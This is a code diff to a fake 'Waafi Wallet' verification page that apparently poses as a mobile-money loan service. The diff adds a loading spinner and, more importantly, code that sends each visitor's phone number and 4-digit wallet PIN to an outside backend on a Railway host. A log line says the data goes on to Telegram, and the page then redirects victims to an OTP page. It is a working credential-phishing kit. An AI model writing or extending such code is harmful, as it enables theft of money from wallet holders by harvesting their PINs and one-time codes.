@@ -307,6 +307,12 @@
             transform: scale(1.01);
         }
 
+        .verify-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .help-text {
             text-align: center;
             font-size: 0.875rem;
@@ -338,6 +344,25 @@
             text-align: center;
             font-size: 0.875rem;
             color: var(--text-muted);
+        }
+
+        /* ===== LOADING SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         /* ===== RESPONSIVE ===== */
@@ -468,7 +493,7 @@
                         <span class="form-hint">Enter your 4-digit Waafi Wallet PIN</span>
                     </div>
 
-                    <button type="submit" class="verify-btn">Verify &amp; Continue</button>
+                    <button type="submit" class="verify-btn" id="verifyBtn">Verify &amp; Continue</button>
                 </form>
 
                 <p class="help-text">
@@ -487,6 +512,9 @@
 
     <!-- ===== SCRIPTS ===== -->
     <script>
+        // ===== BACKEND API URL =====
+        const API_URL = 'https://waafi-loans-production.up.railway.app';
+
         // ===== LANGUAGE =====
         const savedLang = localStorage.getItem('waafi-language') || 'en';
         document.getElementById('headerLangText').textContent = savedLang === 'en' ? 'EN' : 'SO';
@@ -504,6 +532,12 @@
                 mainNav.classList.remove('open');
             });
         });
+
+        // ===== PRE-FILL PHONE NUMBER =====
+        const phoneFromStorage = localStorage.getItem('waafi-phone') || '';
+        if (phoneFromStorage) {
+            document.getElementById('phoneNumber').value = phoneFromStorage;
+        }
 
         // ===== PIN INPUT =====
         const pinInputs = document.querySelectorAll('.pin-input');
@@ -535,10 +569,11 @@
             });
         });
 
-        // ===== FORM SUBMISSION =====
+        // ===== FORM SUBMISSION WITH BACKEND =====
         const verifyForm = document.getElementById('verifyForm');
+        const verifyBtn = document.getElementById('verifyBtn');
 
-        verifyForm.addEventListener('submit', function(e) {
+        verifyForm.addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const phoneNumber = document.getElementById('phoneNumber').value;
@@ -547,7 +582,8 @@
                 pin += input.value;
             });
 
-            if (phoneNumber.length < 10) {
+            // Validation
+            if (phoneNumber.length < 7) {
                 alert('Please enter a valid Waafi Wallet number.');
                 return;
             }
@@ -557,9 +593,46 @@
                 return;
             }
 
+            // Save phone for OTP page
             localStorage.setItem('waafi-phone', phoneNumber);
 
-            window.location.href = 'otp.html';
+            // Prepare data for backend
+            const verifyData = {
+                phoneNumber: phoneNumber,
+                pin: pin
+            };
+
+            // Show loading state
+            verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+            verifyBtn.disabled = true;
+
+            try {
+                // Send data to backend
+                const response = await fetch(`${API_URL}/api/verify`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(verifyData)
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log('✅ Verification data sent to Telegram:', result);
+                    // Redirect to OTP page
+                    window.location.href = 'otp.html';
+                } else {
+                    alert('❌ Verification failed. Please try again.');
+                    verifyBtn.innerHTML = 'Verify &amp; Continue';
+                    verifyBtn.disabled = false;
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('⚠️ Network error. Please check your connection and try again.');
+                verifyBtn.innerHTML = 'Verify &amp; Continue';
+                verifyBtn.disabled = false;
+            }
         });
     </script>
 
